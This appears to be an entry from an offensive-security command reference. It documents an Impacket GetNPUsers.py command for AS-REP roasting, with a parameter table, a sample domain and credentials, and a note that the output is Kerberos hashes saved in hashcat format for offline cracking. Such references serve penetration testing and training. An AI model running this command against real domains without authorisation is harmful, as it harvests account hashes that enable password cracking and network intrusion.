---
id: 775ffc51-cb0f-4716-9067-f346dd8b4007
name: getnpusers-request-format-hashcat
type: command
executor: bash
data: >-
  python GetNPUsers.py $_DOMAIN/$_TARGET_USER:$_PASSWORD -request -format
  hashcat -outputfile $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:04.983402+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - authenticated
verified: true
validated: true
---

# getnpusers-request-format-hashcat

## Command

```bash
python GetNPUsers.py $_DOMAIN/$_TARGET_USER:$_PASSWORD -request -format hashcat -outputfile $_OUTPUT_FILE
```

## Description

Requests AS-REP hash using provided credentials for the user, useful when partial auth is available.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain | Yes |
| $_TARGET_USER:$_PASSWORD | User and password | Yes |
| -request | Request TGT | Yes |
| -format hashcat | Hashcat format | Yes |
| -outputfile $_OUTPUT_FILE | Output file | Yes |

## Examples

### Basic Usage

```bash
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

## Expected Output

$krb5asrep$ hashes saved to the output file.

## Related

- [[procedures/Kerberos-AS-REP-Roasting-Attack]]
- [[tools/Impacket]]
